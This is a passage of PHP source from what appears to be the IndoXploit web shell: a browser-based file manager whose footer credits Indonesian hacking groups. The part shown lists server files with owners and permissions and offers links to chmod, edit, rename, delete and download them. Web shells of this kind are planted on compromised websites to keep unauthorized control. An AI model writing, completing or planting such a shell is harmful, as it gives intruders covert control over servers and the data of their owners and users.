           echo "<td>$downer/$dgrp</td>";
           if($dirx === '.' || $dirx === '..') {
            echo "<td>".w("$dir/$dirx",perms("$dir/$dirx"))."</td>";
           } else {
            echo "<td><a href='?act=chmod_dir&dir=$dir/$dirx' class='text-decoration-none'>".w("$dir/$dirx",perms("$dir/$dirx"))."<a></td>";
           }
           echo "<td style='padding-left: 15px;'>$act_dir</td>";
           echo "</tr>";
        }
     }
  } else {
     echo "<font color=red>can't open directory.</font>";
  }
     foreach($scandir as $file) {
        $ftype = @filetype("$dir/$file");
        $ftime = date("F d Y g:i:s", @filemtime("$dir/$file"));
        $size = @filesize("$dir/$file")/1024;
        $size = round($size,3);
        if(function_exists('posix_getpwuid')) {
           $fowner = @posix_getpwuid(fileowner("$dir/$file"));
           $fowner = $fowner['name'];
        } else {
           $downer = $uid;
           $fowner = @fileowner("$dir/$file");
        }
        if(function_exists('posix_getgrgid')) {
           $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
           $fgrp = $fgrp['name'];
        } else {
           $fgrp = @filegroup("$dir/$file");
        }
        if($size > 1024) {
           $size = round($size/1024,2). 'MB';
        } else {
           $size = $size. 'KB';
        }
        if(!is_file("$dir/$file")) continue;
        echo "<tr>";
        echo "<td><i class='bi bi-file-earmark'></i><a href='?act=view&dir=$dir&file=$dir/$file' class='text-decoration-none'>$file</a></td>";
        echo "<td>$ftype</td>";
        echo "<td>$size</td>";
        echo "<td>$ftime</td>";
        echo "<td>$fowner/$fgrp</td>";
        echo "<td><a href='?act=chmod_file&dir=$dir&file=$dir/$file' class='text-decoration-none'>" . w("$dir/$file", perms("$dir/$file")) . " </a></td>";
        echo "<td style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'><button class='btn btn-success btn-sm'>Edit</button></a> | <a href='?act=rename&dir=$dir&file=$dir/$file'><button class='btn btn-warning btn-sm'>Rename</button></a> | <a href='?act=delete&dir=$dir&file=$dir/$file'><button class='btn btn-danger btn-sm'>Delete</button></a> | <a href='?act=download&dir=$dir&file=$dir/$file'><button class='btn btn-primary btn-sm'>Download</button></a></td>";
        echo "</tr>";
     }
     echo "</table>";
     if(!is_readable($dir)) {
        //
     } else {
        echo "<hr>";
     }
}
echo '
<footer class="bg-dark text-light text-center py-3 mt-4">
   <p class="mb-0">
       Copyright &copy; ' . date("Y") . ' - 
       <span class="text-success fw-bold">IndoXploit, DM ( D\'MasterPiece ), PBM ( Pasukan Berani Mati ), IDB-TE4M, & Kamu &hearts;</span>
   </p>
</footer>';
echo '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>';
